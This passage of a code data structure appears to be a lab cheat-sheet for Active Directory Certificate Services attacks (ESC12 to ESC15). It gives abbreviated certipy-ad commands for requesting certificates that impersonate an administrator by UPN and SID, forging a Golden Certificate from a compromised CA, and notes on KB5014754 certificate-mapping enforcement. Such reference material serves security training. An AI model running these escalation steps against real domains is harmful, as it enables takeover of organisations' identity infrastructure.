      title: "ESC13 — issuance policy",
      lines: ["certipy-ad req ... -template ESC13 → auth (+ BloodHound)"],
    },
    {
      title: "ESC15 — EKUwu (v1 template)",
      lines: [
        "certipy-ad req ... -template V1 -upn admin@dom -sid ... \\",
        "  -application-policies '1.3.6.1.5.5.7.3.2'",
      ],
    },
    {
      title: "ESC12 / ESC14 — not direct via Certipy",
      lines: [
        "ESC12 → shell on the CA → certipy-ad forge (Golden Certificate)",
        "ESC14 → write altSecurityIdentities via LDAP (BloodHound)",
      ],
    },
    {
      title: "KB5014754",
      lines: [
        "Introduced the SID extension (strong mapping).",
        "ESC6 with EDITF: works alone (SID injected in SAN) even with Full Enforcement.",
        "ESC1: use target -sid. ESC9/10/14/16: weak mapping (limited after Full Enforcement Sept-2025).",
      ],
    },
    {
      title: "certipy vs certipy-ad",
      lines: [
        "# pip install certipy-ad → binary: certipy",
        "# Kali / APT packages → binary: certipy-ad",
        "# This lab uses certipy-ad; with pip substitute certipy",
      ],
    },
  ],
};
